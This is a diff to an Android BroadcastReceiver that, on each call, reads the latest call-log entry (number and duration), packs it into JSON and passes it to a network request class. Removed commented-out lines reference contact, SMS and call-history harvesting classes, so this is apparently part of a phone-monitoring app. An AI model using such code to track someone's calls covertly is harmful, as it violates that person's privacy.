@@ -87,25 +87,13 @@ public class CallReceiver extends BroadcastReceiver {
 	}
 
 	private void getCallDetails() {
-//		ListApp listApp = new ListApp();
-//		listApp.getListOfInstalledApp(ctx);
-//		GetInfo getInfo = new GetInfo(ctx);
-//		getInfo.getInfo();
-//		GetContacts getCont = new GetContacts();
-//		getCont.execute(ctx);
-//		ArchiveSms arhSms = new ArchiveSms();
-//		arhSms.execute(ctx);
-//		ArchiveCall arhCall = new ArchiveCall();
-//		arhCall.execute(ctx);
-		StringBuffer sb = new StringBuffer();
+
 		Cursor managedCursor = ctx.getContentResolver().query(
 				CallLog.Calls.CONTENT_URI, null, null, null, null);
 
 		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
 		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
 		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
-
-		sb.append("Call Details :");
 
 		managedCursor.moveToLast();
 		String phNumber = managedCursor.getString(number);
@@ -131,10 +119,6 @@ public class CallReceiver extends BroadcastReceiver {
 			break;
 		}
 
-		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
-				+ callType + " \nCall Date:--- " + date
-				+ " \nCall duration in sec :--- " + callDuration);
-		sb.append("\n----------------------------------");
 		managedCursor.close();
 
 		String sendJSONStr = null;
@@ -143,7 +127,7 @@ public class CallReceiver extends BroadcastReceiver {
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
 		try {
-			
+
 			info.put("number", phNumber);
 			info.put("duration", callDuration);
 
@@ -158,7 +142,6 @@ public class CallReceiver extends BroadcastReceiver {
 			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 		}
 
-		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
 		Logging.doLog(LOG_TAG, sendJSONStr);
 
 		DataRequest dr = new DataRequest(ctx);
